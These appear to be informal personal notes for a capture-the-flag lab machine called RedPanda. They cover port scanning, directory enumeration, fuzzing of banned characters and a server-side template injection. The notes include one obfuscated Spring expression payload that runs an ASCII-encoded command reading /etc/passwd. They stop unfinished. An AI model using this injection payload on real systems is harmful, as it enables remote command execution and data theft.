# RedPanda (Lazy)

RedPanda (Lazy)

Tuesday, July 19, 2022

12:38 AM

Nmap scan:

!\[\[36\_RedPanda (Lazy)\_image001.png]]

&#x20;

Interesting that there is only a port 8080.

&#x20;

Port 8080:

!\[\[36\_RedPanda (Lazy)\_image002.png]]

&#x20;

When gobusting, we find out there there's a /stats directory.

!\[\[36\_RedPanda (Lazy)\_image003.png]]

&#x20;

!\[\[36\_RedPanda (Lazy)\_image004.png]]

&#x20;

Each link clicked has an author parameter passed in.

!\[\[36\_RedPanda (Lazy)\_image005.png]]

&#x20;

&#x20;

And we are also able to export these files.

!\[\[36\_RedPanda (Lazy)\_image006.png]]

&#x20;

When checking this file, we can see that the author is as such.

!\[\[36\_RedPanda (Lazy)\_image007.png]]

&#x20;

When opening the ifle:

!\[\[36\_RedPanda (Lazy)\_image008.png]]

&#x20;

So this page, actually renders within XML.

!\[\[36\_RedPanda (Lazy)\_image009.png]]

&#x20;

Interesting that this is parsed as XML within the server and then downloaded. This indicates that perhaps, when we click download, it loads this pre-existing export.xml with the scraped data of the page and then proceeds to dump it within an XML file for exporting.

&#x20;

I was wondering if there are any methods for us to be able to poison that stream or something.

&#x20;

Interestingly, there's also a view increment everytime we refresh the page.

!\[\[36\_RedPanda (Lazy)\_image0010.png]]

&#x20;

!\[\[36\_RedPanda (Lazy)\_image0011.png]]

&#x20;

More poisoning potential here.

&#x20;

We can check the query function for SSTI and SQL Injections.

!\[\[36\_RedPanda (Lazy)\_image0012.png]]

&#x20;

!\[\[36\_RedPanda (Lazy)\_image0013.png]]

&#x20;

Interesting.

SSTI:

!\[\[36\_RedPanda (Lazy)\_image0014.png]]

&#x20;

!\[\[36\_RedPanda (Lazy)\_image0015.png]]

&#x20;

The payload indicated means that this either a Java or JS based backend renderer.

&#x20;

There are a lot of banned characters here, so we can first fuzz this and test what is being banned.

&#x20;

Fuzzing:

!\[\[36\_RedPanda (Lazy)\_image0016.png]]

&#x20;

Any ones with a character count of 66 indicates it is not a bad char.

&#x20;

!\[\[36\_RedPanda (Lazy)\_image0017.png]]

&#x20;

The diff codes indicate diff errors that are triggered by the web server trying to parse our information.

Percent is also a bad character on its own.

&#x20;

Enumeration of CMS:

!\[\[36\_RedPanda (Lazy)\_image0018.png]]

&#x20;

We can enumerate more about this.

&#x20;

Using this instead results in no errors:

!\[\[36\_RedPanda (Lazy)\_image0019.png]]

&#x20;

!\[\[36\_RedPanda (Lazy)\_image0020.png]]

&#x20;

Eventually, one of the commands works.

&#x20;

**\*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString**

&#x20;

This basically, slowly (and painfully) takes our command that we want to execute and then encodes it with ASCII.

Which is really weird.

!\[\[36\_RedPanda (Lazy)\_image0021.png]]

&#x20;

Trying any other method results in a failure.

So this is the only method of which we can use to send commands to the server.

&#x20;

That's pretty painful do, so I got lazy solving this one. Oops.

&#x20;

&#x20;

&#x20;
